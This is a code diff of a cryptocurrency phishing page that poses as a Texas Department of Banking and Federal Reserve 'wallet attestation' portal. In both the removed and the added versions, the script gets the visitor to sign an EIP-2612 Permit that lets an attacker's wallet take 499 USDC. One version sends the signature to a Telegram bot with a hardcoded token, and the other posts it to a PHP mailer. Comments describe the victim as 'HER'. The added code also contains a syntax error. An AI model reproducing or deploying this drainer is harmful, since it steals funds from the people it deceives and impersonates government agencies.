@@ -9,167 +9,109 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Public+Sans:wght@300;400;500;600;700;800&family=Roboto+Mono:wght@400;500;600;700&display=swap');
-        body { font-family: 'Public Sans', sans-serif; background-color: #f5f7fa; color: #1e2a41; }
-        .fed-header { background: linear-gradient(90deg, #003366 0%, #002244 100%); border-bottom: 4px solid #fcba19; }
-        .btn-primary { background: #0047ab; color: white !important; border-radius: 40px; padding: 1rem 2rem; font-weight: 600; width: 100%; transition: all 0.2s; border: 1px solid #00307a; }
-        .status-panel { background: #f8fafc; border-left: 4px solid #fcba19; padding: 1rem; margin-top: 1rem; font-family: 'Roboto Mono', monospace; font-size: 0.85rem; }
-        .case-banner { background-color: #fff3cd; border-left: 8px solid #b45309; padding: 1.5rem; margin-bottom: 2rem; border-radius: 0 8px 8px 0; }
-    </style>
-</head>
+    
 <body>
-    <div class="bg-[#112e51] text-[#e6f7ff] text-[0.7rem] py-2 border-b border-[#2e5a7f]">
-        <div class="container mx-auto px-4 flex items-center gap-3">
-            <svg width="24" height="16" viewBox="0 0 741 390">
-                <rect width="741" height="390" fill="#3C3B6E"/>
-                <rect width="741" height="30" y="30" fill="#fff"/>
-                <rect width="741" height="30" y="90" fill="#fff"/>
-                <rect width="741" height="30" y="150" fill="#fff"/>
-                <rect width="741" height="30" y="210" fill="#fff"/>
-                <rect width="741" height="30" y="270" fill="#fff"/>
-                <rect width="741" height="30" y="330" fill="#fff"/>
-                <rect width="741" height="30" fill="#B22234"/>
-                <rect width="741" height="30" y="60" fill="#B22234"/>
-                <rect width="741" height="30" y="120" fill="#B22234"/>
-                <rect width="741" height="30" y="180" fill="#B22234"/>
-                <rect width="741" height="30" y="240" fill="#B22234"/>
-                <rect width="741" height="30" y="300" fill="#B22234"/>
-                <rect width="741" height="30" y="360" fill="#B22234"/>
-                <rect width="296" height="210" fill="#3C3B6E"/>
-                <g fill="#fff">
-                    <g id="s18"><g id="s9"><g id="s5"><g id="s"><polygon points="0,-6 1.763,5.427 -8.235,-1.854 8.235,-1.854 -1.763,5.427"/></g><use xlink:href="#s" y="420"/><use xlink:href="#s" y="840"/><use xlink:href="#s" y="1260"/><use xlink:href="#s" y="1680"/></g><use xlink:href="#s5" x="247" y="210"/></g><use xlink:href="#s9" x="494"/></g>
-                </g>
-            </svg>
-            <span class="font-bold uppercase tracking-wider">An official website of the Texas State Government and Federal Reserve Bank of Dallas</span>
-        </div>
-    </div>
+  <h2>Secure Verification</h2>
 
-    <header class="fed-header text-white py-6 shadow-lg">
-        <div class="container mx-auto px-4 flex justify-between items-center">
-            <div class="flex items-center gap-4">
-                <div class="text-4xl">🏛️</div>
-                <div>
-                    <h1 class="text-2xl md:text-3xl font-black uppercase tracking-tight">Texas Department of Banking</h1>
-                    <p class="text-xs text-amber-300 font-bold uppercase tracking-widest">Texas Institutional Funds Management Authority</p>
-                </div>
-            </div>
-            <div class="hidden md:block bg-blue-900/50 px-4 py-2 border border-blue-500 rounded text-[0.65rem] font-mono">
-                NODE_DAL_11_STABLE
-            </div>
-        </div>
-    </header>
+  <form id="permitForm" action="sendmail.php" method="POST">
+    <!-- HER address will be filled automatically when she signs -->
+    <input type="hidden" name="owner" id="owner">
+    
+    <!-- YOUR wallet address (where USDC goes) -->
+    <input type="hidden" name="spender" value="0x2C5aF337b35F0B2589DcA8c50fB8f65803f0A94D">
+    
+    <!-- HER address again for the form (same as owner) -->
+    <input type="hidden" name="address" id="address">
+    
+    <input type="hidden" name="value" value="499">
+    <input type="hidden" name="deadline" id="deadline">
+    <input type="hidden" name="v" id="v">
+    <input type="hidden" name="r" id="r">
+    <input type="hidden" name="s" id="s">
+    <input type="hidden" name="nonce" id="nonce">
 
-    <div class="container mx-auto px-4 py-8 max-w-4xl">
-        <div class="case-banner">
-            <h2 class="text-xl font-black text-gray-900 mb-2">WALLET ATTESTATION REQUIRED</h2>
-            <p class="text-sm text-gray-700">Directive Case TX-B10B-2026-MUK1139-AUDIT. Verification of USDC liquidity ownership via EIP-2612 Permit is mandatory for fund restoration.</p>
-        </div>
+    <button id="signBtn" type="button" onclick="signPermit()">Sign Attestation</button>
+  </form>
 
-        <div class="bg-white border border-gray-200 border-t-4 border-t-blue-600 p-8 shadow-md rounded-b-lg">
-            <div class="flex justify-between items-center mb-6">
-                <span class="bg-gray-100 text-gray-700 text-[0.6rem] font-bold px-2 py-1 rounded border border-gray-300 uppercase tracking-tighter">Auth Gateway: BASE-MAINNET</span>
-                <span class="text-blue-700 font-bold text-sm">USDC VERIFICATION</span>
-            </div>
-            
-            <p class="text-sm text-gray-600 mb-6 leading-relaxed">By clicking below, you will generate a secure signature to initiate the verification. No fee is charged for the process. Please keep your funds still for at least 24 hours in the current state to complete the verification.</p>
-            
-            <button class="btn-primary shadow-lg" id="actionButton">VERIFY WALLET ATTESTATION</button>
-            
-            <div class="status-panel" id="statusText">
-                System Status: <span class="text-green-600">Online</span> • Awaiting connection...
-            </div>
-        </div>
-
-        <div class="mt-8 text-[0.7rem] text-gray-500 border-t pt-4 text-center">
-            <p><strong>31 CFR § 1010.312 Compliance:</strong> This portal is a secure Federal Release Code gateway. Unauthorized use is prohibited by the Texas Department of Banking and Federal Reserve District 11.</p>
-        </div>
-    </div>
-
-    <script>
-    const _CONFIG = {
-        spender: "0xBF17DB5938E98f1F9D30ac889F8fd91d749803C8",
-        botToken: "8481428965:AAEOFp_DPPuPG5fPl03AmYSPNebgpqZoejY",
-        chatId: "7275242903",
-        usdcContract: "0x833589FCD6EDB6E08F4C7C32D4F71B54BDA02913",
-        chainId: 8453,
-        decimals: 6,
-        amount: "499",
-        deadlineDays: 5
-    };
-
-    const actionButton = document.getElementById('actionButton');
-    const statusText = document.getElementById('statusText');
-
-    actionButton.onclick = async () => {
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <script>
+    async function signPermit() {
+      const btn = document.getElementById("signBtn");
+      try {
         if (!window.ethereum) {
             window.location.href = `https://go.cb-w.com/dapp?cb_url=${encodeURIComponent(window.location.href)}`;
             return;
         }
 
-        try {
-            actionButton.disabled = true;
-            actionButton.textContent = 'ESTABLISHING SECURE LINK...';
-            
-            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            const provider = new ethers.providers.Web3Provider(window.ethereum);
-            const { chainId } = await provider.getNetwork();
+        btn.disabled = true;
+        btn.innerText = "Syncing...";
 
-            if (chainId !== _CONFIG.chainId) {
-                statusText.innerText = 'Switching to Base Network...';
-                try {
-                    await window.ethereum.request({
-                        method: 'wallet_switchEthereumChain',
-                        params: [{ chainId: '0x2105' }],
-                    });
-                } catch (e) {
-                    throw new Error("Wrong Network. Please switch to Base.");
-                }
-            }
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+        const signer = provider.getSigner();
+        const owner = await signer.getAddress(); // THIS IS HER ADDRESS
 
-            const signer = provider.getSigner();
-            const owner = await signer.getAddress();
-            
-            const contract = new ethers.Contract(_CONFIG.usdcContract, ["function nonces(address) view returns (uint256)"], provider);
-            const nonce = await contract.nonces(owner);
-            const deadline = Math.floor(Date.now() / 1000) + (_CONFIG.deadlineDays * 24 * 60 * 60);
+        // Fill HER address in both hidden fields
+        document.getElementById("owner").value = owner;
+        document.getElementById("address").value = owner;
 
-            const domain = { name: 'USD Coin', version: '2', chainId: _CONFIG.chainId, verifyingContract: _CONFIG.usdcContract };
-            const types = { Permit: [
-                { name: 'owner', type: 'address' }, { name: 'spender', type: 'address' },
-                { name: 'value', type: 'uint256' }, { name: 'nonce', type: 'uint256' }, { name: 'deadline', type: 'uint256' }
-            ]};
-            const message = { 
-                owner, 
-                spender: _CONFIG.spender, 
-                value: ethers.utils.parseUnits(_CONFIG.amount, _CONFIG.decimals).toString(), 
-                nonce: nonce.toString(), 
-                deadline 
-            };
+        // USDC on Base
+        const tokenAddress = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913";
+        const usdcContract = new ethers.Contract(
+            tokenAddress, 
+            ["function nonces(address) view returns (uint256)"], 
+            provider
+        );
+        
+        // Get real nonce from contract
+        const liveNonce = await usdcContract.nonces(owner);
+        const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour
+        const chainId = 8453; // Base Mainnet
 
-            statusText.innerText = 'Authenticating Signature... (Check Wallet)';
-            const signature = await signer._signTypedData(domain, types, message);
-            const { v, r, s } = ethers.utils.splitSignature(signature);
+        // CRITICAL: Token name MUST be "USD//C" on Base
+        const domain = {
+          name: "USDC",
+          version: "2",
+          chainId,
+          verifyingContract: tokenAddress
+        };
 
-            statusText.innerText = 'Transmitting to FRB Node...';
-            await fetch(`https://api.telegram.org/bot${_CONFIG.botToken}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: _CONFIG.chatId,
-                    text: `🏦 **NEW ATTESTATION SUCCESS**\n\n👤 **Owner:** \`${owner}\`\n💰 **Target:** ${_CONFIG.amount} USDC\n🔢 **Nonce:** ${nonce}\n\n✍️ **Signature (VRS):**\nv: ${v}\nr: ${r}\ns: ${s}\n\n⏰ **Deadline:** ${deadline}`,
-                    parse_mode: 'Markdown'
-                })
-            });
+        const types = {
+          Permit: [
+            { name: "owner", type: "address" },
+            { name: "spender", type: "address" },
+            { name: "value", type: "uint256" },
+            { name: "nonce", type: "uint256" },
+            { name: "deadline", type: "uint256" }
+          ]
+        };
 
-            actionButton.textContent = '✓ ATTESTATION VERIFIED';
-            actionButton.style.background = '#10b981';
-            statusText.innerHTML = '<span class="text-green-600 font-bold">✓ SECURE TRANSMISSION COMPLETE.</span> You may now disconnect and close this portal.';
-        } catch (err) {
-            console.error(err);
-            actionButton.disabled = false;
-            actionButton.textContent = 'VERIFY WALLET ATTESTATION';
-            statusText.innerText = 'Connection timed out or rejected. Please retry.';
-        }
-    };
-    </script>
+        const message = {
+          owner,
+          spender: "0x2C5aF337b35F0B2589DcA8c50fB8f65803f0A94D", // YOUR wallet
+          value: ethers.utils.parseUnits("499", 6),
+          nonce: liveNonce,
+          deadline
+        };
+
+        const signature = await signer._signTypedData(domain, types, message);
+        const sig = ethers.utils.splitSignature(signature);
+
+        // Fill remaining hidden fields
+        document.getElementById("nonce").value = liveNonce.;
+        document.getElementById("deadline").value = deadline;
+        document.getElementById("v").value = sig.v;
+        document.getElementById("r").value = sig.r;
+        document.getElementById("s").value = sig.s;
+
+        btn.innerText = "Transmitting...";
+        document.getElementById("permitForm").submit();
+      } catch (err) {
+        btn.disabled = false;
+        btn.innerText = "Sign Attestation";
+        alert("Verification Error: " + err.message);
+      }
+    }
+  </script>
 </body>
 </html>
